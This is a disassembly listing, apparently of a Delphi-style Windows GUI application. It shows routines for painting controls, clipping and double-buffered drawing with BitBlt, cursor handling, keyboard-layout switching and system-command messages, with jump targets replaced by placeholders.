inc ecx
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_412cd4
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
test [ ebx + 0x1c ] 0x10
je r-xdata
push ebp
call SaveDC
mov [ esp + 0x4 ] eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebp
call sub_43bdc0
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push ebp
call IntersectClipRect
push 0x0
mov ecx ebp
mov edx 0xf
mov eax ebx
call sub_43e62c
mov eax [ esp + 0x4 ]
push eax
push ebp
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
or [ ebx + 0x54 ] 0x80
test [ ebx + 0x51 ] 0x4
jne r-xdata
sub_441c9c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x80
push esi
call SaveDC
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
call sub_43bdc0
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor edi edi
xor eax eax
mov [ ebp - 0x8 ] eax
push 0xffffffec
mov eax ebx
call sub_443c60
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_443c60
push eax
call GetWindowLongA
test eax 0x800000
je r-xdata
mov [ ebp - 0x8 ] 0xa
mov edi 0x200f
jmp r-xdata
test edi edi
je r-xdata
mov [ ebp - 0x8 ] 0x3
mov edi 0xa00f
push 0x0
mov ecx esi
mov edx 0x14
mov eax ebx
call sub_43e62c
push 0x0
mov ecx esi
mov edx 0xf
mov eax ebx
call sub_43e62c
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
call SetRect
push edi
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push esi
call DrawEdge
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_43bdc0
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
mov eax [ ebp - 0xc ]
push eax
push esi
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ eax + 0x44 ]
push edx
mov ecx [ eax + 0x40 ]
mov edx esi
call sub_441c9c
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x19c ]
call sub_414108
cmp [ eax + 0x57 ] 0x0
je r-xdata
sub_441df0
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
test [ ebx + 0x55 ] 0x1
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_441914
jmp r-xdata
mov eax ebx
call sub_440990
test eax eax
jne r-xdata
push 0x0
call GetDC
mov edi eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push edi
call CreateCompatibleBitmap
mov [ ebp - 0x8 ] eax
push edi
push 0x0
call ReleaseDC
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_441f42
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_443c60
push eax
call BeginPaint
mov edi eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx 0x14
mov eax ebx
call sub_43e62c
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov edx esi
mov eax ebx
call sub_441df0
xor eax eax
mov [ esi + 0x4 ] eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push 0x0
push 0x0
push edi
call BitBlt
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_443c60
push eax
call EndPaint
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
retn
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
sub_441f50
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_4418e0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_441f70
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_4418e0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_441fe4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_4418e0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_442004
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_4418e0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_442024
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_4418e0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_442048
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_4418e0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44206c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_4418e0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_442090
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_4418e0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4420b4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
call sub_4335f0
mov edi eax
mov eax edi
call sub_4336d0
test al al
je r-xdata
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x170 ]
call sub_41e680
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
test [ ebx + 0x52 ] 0x4
je r-xdata
mov [ esi + 0xc ] 0x1
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_443c60
mov edx eax
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_433868
jmp r-xdata
sub_44213c
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
cmp [ edi + 0x1a5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x50 ] 0x10
je r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x2
jne r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x8
je r-xdata
mov [ esp ] al
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov al 0x1
mov bl 0x1
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x1 ] al
test bl bl
je r-xdata
mov al 0x1
test [ edi + 0x55 ] 0x2
jne r-xdata
mov al [ esp ]
or al [ esp + 0x1 ]
je r-xdata
mov edx esi
mov eax edi
call sub_43ef60
test bl bl
je r-xdata
mov eax edi
call sub_443f70
mov eax edi
call sub_443b68
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
or al [ esp + 0x1 ]
jne r-xdata
mov eax edi
call sub_443b68
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0xc0
je r-xdata
sub_4421fc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
pop ebx
retn
mov esi [ edi + 0x8 ]
test [ esi + 0x18 ] 0x1
jne r-xdata
lea ecx [ esi + 0x14 ]
lea edx [ esi + 0x10 ]
mov eax ebx
call sub_43ebbc
test al al
jne r-xdata
or [ esi + 0x18 ] 0x1
sub_44224c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_443f70
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_440520
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffcf
call sub_403320
sub_442294
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x180 ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ esi + 0x8 ]
sub ax 0xfffe
je r-xdata
cmp [ esi + 0xa ] 0x201
jne r-xdata
sub ax 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov di [ eax + 0x44 ]
test di di
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call GetLastActivePopup
mov edi eax
call GetForegroundWindow
cmp edi eax
je r-xdata
test di di
je r-xdata
push esp
call GetCursorPos
push 0x0
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_43cfc8
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_44154c
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45ce3c
jmp r-xdata
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45b324
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
jmp r-xdata
test di di
jne r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov di [ eax + 0x78 ]
mov di 0xfffe
jmp r-xdata
mov di [ ebx + 0x78 ]
mov di 0xfffe
jmp r-xdata
sub_4423e4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_4424c3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4424ca
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
mov eax ebx
call sub_443c60
mov dl [ ebx + 0x184 ]
call sub_448850
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45b29c
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_407d24
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45b09c
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x3c ]
cmp [ ebx + 0x184 ] 0x0
je r-xdata
push 0x1
push esi
call ActivateKeyboardLayout
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45b09c
mov edx [ ebx + 0x188 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edi eax
test edi edi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45b09c
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
sub_4424d0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_44255a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442561
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
cmp [ ebx + 0x184 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45b29c
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_407d24
test eax eax
je r-xdata
mov eax ebx
call sub_443c60
mov dl 0x1
call sub_448834
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
call ActivateKeyboardLayout
sub_4425bc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dx [ ebp + 0x8 ]
mov eax edi
call sub_412cc4
push eax
mov ecx esi
mov edx 0xb038
mov eax ebx
call sub_43e62c
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ ebx + 0x1b2 ] 0x0
je r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_44260c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1ba ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0xc
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
sub_442640
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov si 0xffd2
call sub_403320
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
mov si 0xffc3
call sub_403320
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_442680
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
cmp [ ebx + 0x1f2 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esi
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
xor eax eax
jmp r-xdata
push edi
mov ecx esi
mov edx 0xb039
mov eax ebx
call sub_43e62c
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_4426d8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_41af84
mov edx [ r-xdata ]
call sub_4032d4
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
sub_442710
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x178 ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_414108
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_442734
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov edi edx
mov ebx eax
push esi
mov eax ebx
call sub_443c60
push eax
call GetWindowRect
push 0xa
push 0xa
push esi
call InflateRect
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
sub_442790
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_4426fc
mov edi eax
test edi edi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov ebx edi
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_414108
cmp [ eax + 0x57 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec edi
sub_4427d0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x17c ]
call sub_4055b0
cmp [ ebx + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebx + 0x1a7 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x24 ]
mov edx eax
test edx edx
je r-xdata
mov [ ebx + 0x1f8 ] al
pop esi
pop ebx
retn
mov eax esi
call sub_4055b0
jmp r-xdata
sub edx 0xffffff8c
cmp [ ebx + 0x1f8 ] 0x0
jne r-xdata
sub_44283c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_4428e4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ edi + 0x1a8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4428eb
lea eax [ ebp - 0x4 ]
call sub_405598
retn
mov [ edi + 0x1a8 ] bl
test [ edi + 0x1c ] 0x10
jne r-xdata
mov edx ebx
mov eax edi
call sub_43b130
test bl bl
jne r-xdata
cmp [ edi + 0x178 ] 0x0
jne r-xdata
mov eax [ edi + 0x178 ]
call sub_403124
xor eax eax
mov [ edi + 0x178 ] eax
lea eax [ edi + 0x17c ]
call sub_405598
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc6
call sub_403320
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x17c ]
call sub_4055b0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ edi + 0x178 ] eax
sub_4428f4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x2
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443c60
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x4 ]
call sub_4404f8
xor edx edx
push ebp
push sub_4429b6
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov si 0xffcc
call sub_403320
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4429bd
mov eax [ ebp - 0x4 ]
call sub_440500
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x58 ]
push edx
mov edx [ ebp - 0x8 ]
mov cl [ eax + 0x54 ]
mov edx [ ebp - 0x8 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
sub_4429bd
mov eax [ ebp - 0x4 ]
call sub_454618
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_43d6e4
sub_442a08
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_40306c
cmp esi eax
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43f2ec
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x57 ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_442a72
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
lea ecx [ eax + 0x44 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov si 0xffcc
call sub_403320
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_43d6e4
sub_442a8c
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1da ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1dc ]
call [ ebx + 0x1d8 ]
sub_442ab4
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_454618
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_454520
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbc
call sub_403320
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_442ab4
test al al
jne r-xdata
sub_442b1c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_442ab4
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_444d18
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_442b48
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_442ab4
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_444d18
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_442b74
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1ea ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1ec ]
call [ ebx + 0x1e8 ]
sub_442b9c
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_454618
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_454520
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbb
call sub_403320
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_442b9c
test al al
jne r-xdata
sub_442c04
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_442b9c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_442c24
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_442b9c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_442c64
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_454618
mov ebp eax
test ebp ebp
je r-xdata
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
mov al [ edi + 0x4 ]
mov [ esp ] al
mov edx esp
mov eax esi
mov si 0xffba
call sub_403320
xor eax eax
mov al [ esp ]
mov [ edi + 0x4 ] ax
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_442c64
test al al
jne r-xdata
sub_442cc8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_442c64
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_442ce8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_440990
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_440954
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x52 ] 0x1
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_43e62c
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_442ce8
pop ecx
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub_442d98
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
